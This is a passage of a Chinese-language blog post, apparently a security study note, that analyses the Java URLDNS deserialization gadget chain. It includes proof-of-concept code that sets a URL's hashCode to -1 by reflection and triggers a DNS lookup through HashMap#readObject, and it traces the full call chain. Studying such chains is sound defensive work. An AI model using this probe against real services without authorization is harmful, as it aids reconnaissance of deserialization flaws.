punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1.加载Class对象</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//利用java反射机制获取url的hashcode</span><span class="token class-name">Field</span> filed <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//因为hashCode是私有方法，所以要设置true</span>filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先利用反射获取到java.net.URL类，再利用反射获取到java.net.URL类中的hashCode属性并将其设为公有变量。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">filed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将url的hashCode属性设置为-1，这样才能触发url解析。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>触发HashMap的readObject()方法</p><h2 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h2><p>通过payload我们发现最终调用的是HashMap的readObject()方法，进入查看</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161810739.png"></p><p>再跟进1413行hash(key)</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703162030960.png"></p><p>此时会去获取key的hashCode()函数获取hashCode，而我们的key是java.net.URL，所以此时会去调用java.net.URL的hashCode()方法，继续更进</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161824219.png"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161904508.png"></p><p>发现当hashCode等于-1时，会重新计算hashCode，通过URLStreamHandler的hashCode()方法</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161912130.png"></p><p>在这里就会进行一次DNS解析。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220703161918308.png"></p><p>完整调用链如下：</p><pre class="line-numbers language-none"><code class="language-none">HashMap#readObject()HashMap#hash()URL#hashCode()URLStreamHandler#hashCode()URLStreamHandler#getHostAddress()URLStreamHandler#getHostAddress()InetAddress-&gt;getByName()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> urldns </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
